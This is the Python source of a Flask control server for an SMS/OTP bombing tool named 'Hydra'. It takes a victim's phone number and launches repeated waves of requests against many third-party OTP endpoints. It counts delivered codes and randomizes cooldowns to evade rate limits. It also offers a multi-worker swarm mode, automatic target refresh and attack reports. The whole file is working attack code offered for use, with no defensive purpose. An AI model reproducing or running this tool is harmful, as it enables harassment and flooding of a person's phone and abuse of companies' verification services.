"""
╔══════════════════════════════════════════════════════════════╗
║         HYDRA SERVER  —  Flask SSE API  (:4040)             ║
║                                                              ║
║  Endpoints:                                                  ║
║    GET  /api/status        → current attack state JSON      ║
║                              Phase 9: includes php_bridge   ║
║    GET  /api/categories    → list of target categories      ║
║    GET  /api/stream        → SSE live log stream            ║
║    GET  /api/intel         → Phase 3.4 intelligence stats   ║
║    POST /api/start         → start SMS wave attack          ║
║    POST /api/stop          → graceful stop                  ║
║    POST /api/swarm/start   → Phase 5 — launch swarm         ║
║    POST /api/swarm/stop    → Phase 5 — stop all workers     ║
║    GET  /api/swarm/status  → Phase 5 — per-worker stats     ║
║    GET  /api/report/list   → Phase 6 — list saved reports   ║
║    POST /api/report/generate → Phase 6 — manual generate   ║
║    GET  /hydra_reports/<f> → Phase 6 — serve report file    ║
╚══════════════════════════════════════════════════════════════╝
"""

import json
import queue
import sys
import os
import threading
import time
from datetime import datetime

from flask import Flask, Response, jsonify, request, send_from_directory
from flask_cors import CORS

# ── Import Hydra engine ──────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Phase 6 — Report generator
try:
    from hydra_reporter import generate_report, list_reports
    _REPORTER_OK = True
except ImportError:
    _REPORTER_OK = False

from hydra_v4 import (
    TARGETS, RECOVERY_TARGETS, STOP,
    run_wave, liveness_check, save_log, session_log, db_get_stats,
    _AUTOSYNC_AVAILABLE, _DB_PATH,
    _PHP_AVAILABLE,   # Phase 9 — PHP bridge availability
)
try:
    from hydra_autosync import build_dynamic_targets as _autosync
    from hydra_autosync import start_scheduled_refresh
    _AUTOSYNC_OK = True
except ImportError:
    _AUTOSYNC_OK = False

# ─────────────────────────────────────────────────────────────
#  FLASK SETUP
# ─────────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app, origins=["http://localhost:3001", "http://localhost:3000", "http://127.0.0.1:3001"])

# ─────────────────────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────────────────────
_state = {
    "running":     False,
    "phone":       "",
    "wave":        0,
    "sent":        0,
    "blocked":     0,
    "ratelimited": 0,
    "fake200":     0,
    "api_count":   len(TARGETS),   # updated after liveness check in bg thread
}
# Pre-seed immediately from static TARGETS so /api/categories never returns 0
# The background thread below will enrich with autosync + liveness check
_active_targets: list = list(TARGETS)
_attack_thread: threading.Thread | None = None
_log_queue: queue.Queue = queue.Queue(maxsize=2000)
_last_report: dict = {}   # Phase 6 — tracks last generated report paths


def _push_log(msg: str, lvl: str = "info"):
    entry = {"t": datetime.now().strftime("%H:%M:%S"), "msg": msg, "lvl": lvl}
    try:
        _log_queue.put_nowait(entry)
    except queue.Full:
        try:
            _log_queue.get_nowait()
            _log_queue.put_nowait(entry)
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────
#  LOG CALLBACK  (called by fire() in real-time)
# ─────────────────────────────────────────────────────────────
def _on_result(r: dict):
    verdict = r.get("verdict", "?")
    name    = r.get("target", "?")
    cat     = r.get("category", "?")
    status  = r.get("status", "?")
    ms      = r.get("resp_time_ms", "")
    ms_str  = f"  {ms}ms" if ms else ""

    lvl_map = {
        "OTP_SENT":    "success",
        "RATE_LIMITED":"warn",
        "200_FAKE":    "warn",
        "BLOCKED":     "error",
    }
    lvl = "error" if str(verdict).startswith("FAIL") else lvl_map.get(verdict, "info")
    _push_log(f"{name:<15} [{cat:<12}] {verdict:<14}  HTTP {status}{ms_str}", lvl)

    # Update counters
    if verdict == "OTP_SENT":
        _state["sent"] += 1
    elif verdict == "BLOCKED":
        _state["blocked"] += 1
    elif verdict == "RATE_LIMITED":
        _state["ratelimited"] += 1
    elif verdict == "200_FAKE":
        _state["fake200"] += 1


# ─────────────────────────────────────────────────────────────
#  ATTACK RUNNER  (background thread)
# ─────────────────────────────────────────────────────────────
def _run_attack(phone: str, mode: str, category: str, stagger: float, max_waves: int, dual_vector: bool = False):
    global _active_targets
    STOP.clear()
    _state.update(running=True, phone=phone, wave=0, sent=0, blocked=0, ratelimited=0, fake200=0)

    targets = [t for t in _active_targets if category == "all" or t.get("category") == category]
    _push_log(f"HYDRA ONLINE — Target: {phone}  |  APIs: {len(targets)}  |  Mode: {mode}", "sys")

    wave    = 0
    debug   = (mode == "debug")
    single  = mode in ("single", "debug")

    try:
        while not STOP.is_set():
            wave += 1
            _state["wave"] = wave
            _push_log(f"─── WAVE {wave:03d}  [{datetime.now().strftime('%H:%M:%S')}] ───", "sys")

            # inject log callback into fire() via run_wave
            results = run_wave(phone, targets, wave_num=wave, debug=debug,
                               stagger=stagger, log_fn=_on_result, dual_vector=dual_vector)
            session_log["waves_fired"] = wave
            session_log["results"].extend(results)

            sent_this = sum(1 for r in results if r.get("verdict") == "OTP_SENT")
            _push_log(f"Wave {wave} done — {sent_this}/{len(results)} OTP_SENT", "sys")

            if single or (max_waves and wave >= max_waves):
                break

            if STOP.is_set():
                break

            import random
            cooldown = max(1.5, min(8.0, random.gauss(4.0, 1.5)))
            end = time.time() + cooldown
            while time.time() < end and not STOP.is_set():
                time.sleep(0.2)

    except Exception as e:
        _push_log(f"ATTACK ERROR: {e}", "error")
    finally:
        _state["running"] = False
        session_log["end_time"] = datetime.now().isoformat()
        save_log()
        _push_log("Attack stopped. Session saved.", "sys")
        # Phase 6 — auto-generate report
        if _REPORTER_OK and session_log.get("results"):
            try:
                html_p, json_p = generate_report(dict(session_log))
                _last_report["html"] = html_p
                _last_report["json"] = json_p
                _last_report["session_id"] = session_log.get("session_id", "")
                _push_log(f"Report saved → {os.path.basename(html_p)}", "sys")
            except Exception as _re:
                _push_log(f"Report generation failed: {_re}", "warn")


# ─────────────────────────────────────────────────────────────
#  SERVER STARTUP  (init targets once)
# ─────────────────────────────────────────────────────────────
_LIVENESS_CACHE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "hydra_data", "liveness_cache.json")
_LIVENESS_CACHE_TTL  = 1800   # 30 minutes — skip full probe if cache is fresh

def _load_liveness_cache() -> list | None:
    """Return cached live target names if cache is < 30 min old, else None."""
    try:
        with open(_LIVENESS_CACHE_PATH, encoding="utf-8") as f:
            data = json.load(f)
        age = time.time() - data.get("ts", 0)
        if age < _LIVENESS_CACHE_TTL:
            return data.get("names", [])
    except Exception:
        pass
    return None

def _save_liveness_cache(live_targets: list):
    try:
        os.makedirs(os.path.dirname(_LIVENESS_CACHE_PATH), exist_ok=True)
        with open(_LIVENESS_CACHE_PATH, "w", encoding="utf-8") as f:
            json.dump({"ts": time.time(), "names": [t.get("name") for t in live_targets]}, f)
    except Exception:
        pass

def _init_targets():
    global _active_targets
    # Step 1 — autosync (fast: uses offline cache if GitHub unreachable)
    if _AUTOSYNC_OK:
        _active_targets = _autosync(TARGETS, verbose=False)
    else:
        _active_targets = list(TARGETS)

    # Step 2 — liveness: use cached results if fresh, otherwise probe and save
    cached_names = _load_liveness_cache()
    if cached_names is not None:
        # Filter to names in the cache (skip dead ones from last check)
        name_set = set(cached_names)
        _active_targets = [t for t in _active_targets if t.get("name") in name_set]
        _push_log(f"Server ready — {len(_active_targets)} live APIs (cached liveness)", "sys")
    else:
        try:
            _active_targets = liveness_check(_active_targets, verbose=False)
            _save_liveness_cache(_active_targets)
        except Exception:
            pass
        _push_log(f"Server ready — {len(_active_targets)} live APIs", "sys")

    _state["api_count"] = len(_active_targets)

    # Phase 8.2 — background refresh every 30 min
    if _AUTOSYNC_OK:
        start_scheduled_refresh(_active_targets, TARGETS, interval_seconds=1800)


threading.Thread(target=_init_targets, daemon=True).start()


# ─────────────────────────────────────────────────────────────
#  ROUTES
# ─────────────────────────────────────────────────────────────

@app.route("/api/status")
def api_status():
    s = dict(_state)
    s["api_count"]   = len(_active_targets)
    # Phase 9 — PHP bridge availability
    s["php_bridge"]  = bool(_PHP_AVAILABLE)
    s["php_version"] = _PHP_AVAILABLE if _PHP_AVAILABLE else None
    return jsonify(s)


@app.route("/api/categories")
def api_categories():
    cats: dict = {}
    for t in _active_targets:
        c = t.get("category", "sms")
        cats[c] = cats.get(c, 0) + 1
    result = [{"name": k, "count": v} for k, v in sorted(cats.items())]
    return jsonify(result)


@app.route("/api/intel")
def api_intel():
    """Phase 3.4 — intelligence stats from SQLite DB."""
    try:
        stats = db_get_stats(days=7)
        # top 10, plus category breakdown from recent results
        import sqlite3
        top = stats[:10]
        cat_stats: list = []
        try:
            con = sqlite3.connect(_DB_PATH)
            rows = con.execute("""
                SELECT category,
                       COUNT(*) AS total,
                       SUM(CASE WHEN verdict='OTP_SENT' THEN 1 ELSE 0 END) AS hits
                FROM results
                WHERE id > (SELECT MAX(id) - 50000 FROM results)
                GROUP BY category
                ORDER BY hits DESC
            """).fetchall()
            con.close()
            cat_stats = [{"category": r[0], "total": r[1], "hits": r[2]} for r in rows]
        except Exception:
            pass
        return jsonify({"top_targets": top, "by_category": cat_stats})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/start", methods=["POST"])
def api_start():
    global _attack_thread
    if _state["running"]:
        return jsonify({"ok": False, "error": "Attack already running"})

    body     = request.get_json(force=True, silent=True) or {}
    phone    = str(body.get("phone", "")).strip()
    mode     = body.get("mode", "swarm")
    category = body.get("category", "all")
    stagger  = float(body.get("stagger", 0.3))
    max_waves= int(body.get("maxWaves", 0))
    dual_vec = bool(body.get("dualVector", False))

    if not phone.isdigit() or len(phone) < 10:
        return jsonify({"ok": False, "error": "Invalid phone number"})

    session_log["target_phone"] = phone
    session_log["start_time"]   = datetime.now().isoformat()
    session_log["results"]      = []

    _attack_thread = threading.Thread(
        target=_run_attack,
        args=(phone, mode, category, stagger, max_waves, dual_vec),
        daemon=True,
        name="hydra-attack"
    )
    _attack_thread.start()
    return jsonify({"ok": True})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    STOP.set()
    return jsonify({"ok": True})


@app.route("/api/stream")
def api_stream():
    """Server-Sent Events stream for live log output."""
    def generate():
        yield "data: " + json.dumps({"lvl": "ping", "t": "", "msg": ""}) + "\n\n"
        while True:
            try:
                entry = _log_queue.get(timeout=20)
                yield "data: " + json.dumps(entry) + "\n\n"
            except queue.Empty:
                # keepalive ping every 20s
                yield "data: " + json.dumps({"lvl": "ping", "t": "", "msg": ""}) + "\n\n"

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ─────────────────────────────────────────────────────────────
#  PHASE 6 — REPORTING ROUTES
# ─────────────────────────────────────────────────────────────
_REPORTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_reports")

@app.route("/api/report/list")
def api_report_list():
    """Phase 6 — list all generated reports."""
    if not _REPORTER_OK:
        return jsonify({"ok": False, "error": "hydra_reporter not available"})
    return jsonify(list_reports(_REPORTS_DIR))


@app.route("/api/report/generate", methods=["POST"])
def api_report_generate():
    """Phase 6 — manually trigger report for last session."""
    if not _REPORTER_OK:
        return jsonify({"ok": False, "error": "hydra_reporter not available"})
    if not session_log.get("results"):
        return jsonify({"ok": False, "error": "No session data to report"})
    try:
        html_p, json_p = generate_report(dict(session_log), _REPORTS_DIR)
        sid = session_log.get("session_id", "")
        _last_report.update(html=html_p, json=json_p, session_id=sid)
        return jsonify({"ok": True, "html_file": os.path.basename(html_p), "json_file": os.path.basename(json_p)})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/hydra_reports/<path:filename>")
def serve_report(filename: str):
    """Phase 6 — serve HTML/JSON report files."""
    return send_from_directory(_REPORTS_DIR, filename)


# ─────────────────────────────────────────────────────────────
#  PHASE 5 — SWARM ROUTES
# ─────────────────────────────────────────────────────────────

try:
    from hydra_swarm_manager import SwarmManager, get_swarm_state, _swarm_state
    _SWARM_OK = True
except ImportError:
    _SWARM_OK = False

_swarm_manager: "SwarmManager | None" = None
_swarm_thread:  "threading.Thread | None" = None


@app.route("/api/swarm/start", methods=["POST"])
def api_swarm_start():
    global _swarm_manager, _swarm_thread

    if not _SWARM_OK:
        return jsonify({"ok": False, "error": "hydra_swarm_manager not found"})

    if _swarm_state.get("running"):
        return jsonify({"ok": False, "error": "Swarm already running"})

    body        = request.get_json(force=True, silent=True) or {}
    phone       = str(body.get("phone", "")).strip()
    n_workers   = int(body.get("workers", 3))
    stagger     = float(body.get("stagger", 0.3))
    max_waves   = int(body.get("maxWaves", 0))
    dual_vector = bool(body.get("dualVector", False))

    if not phone.isdigit() or len(phone) < 10:
        return jsonify({"ok": False, "error": "Invalid phone"})

    _swarm_manager = SwarmManager(
        phone       = phone,
        n_workers   = max(1, min(n_workers, 10)),
        stagger     = max(0.05, stagger),
        max_waves   = max(0, max_waves),
        dual_vector = dual_vector,
        verbose     = False,
    )
    _swarm_state["running"] = True
    _swarm_state["phone"]   = phone
    _swarm_state["workers"] = n_workers

    def _run_swarm():
        try:
            _swarm_manager.run()
        finally:
            _swarm_state["running"] = False

    _swarm_thread = threading.Thread(target=_run_swarm, daemon=True, name="hydra-swarm")
    _swarm_thread.start()
    _push_log(f"Swarm launched — {n_workers} workers, phone={phone}", "info")
    return jsonify({"ok": True, "workers": n_workers})


@app.route("/api/swarm/stop", methods=["POST"])
def api_swarm_stop():
    if _swarm_manager:
        try:
            _swarm_manager._stop_event.set()
        except Exception:
            pass
    _swarm_state["running"] = False
    _push_log("Swarm stopped by user", "warn")
    return jsonify({"ok": True})


@app.route("/api/swarm/status", methods=["GET"])
def api_swarm_status():
    if not _SWARM_OK:
        return jsonify({"available": False})
    state = get_swarm_state()
    if _swarm_manager:
        state["worker_detail"] = {
            str(wid): {
                "wave":    s.get("wave",    0),
                "sent":    s.get("sent",    0),
                "blocked": s.get("blocked", 0),
                "targets": s.get("targets", 0),
                "done":    s.get("done",    False),
                "error":   s.get("error",   None),
            }
            for wid, s in _swarm_manager._worker_stats.items()
        }
        state["running"] = _swarm_state.get("running", False)
    state["available"] = True
    return jsonify(state)


# ─────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\033[92m[HYDRA SERVER] Starting on http://localhost:4040\033[0m")
    app.run(host="0.0.0.0", port=4040, debug=False, threaded=True)
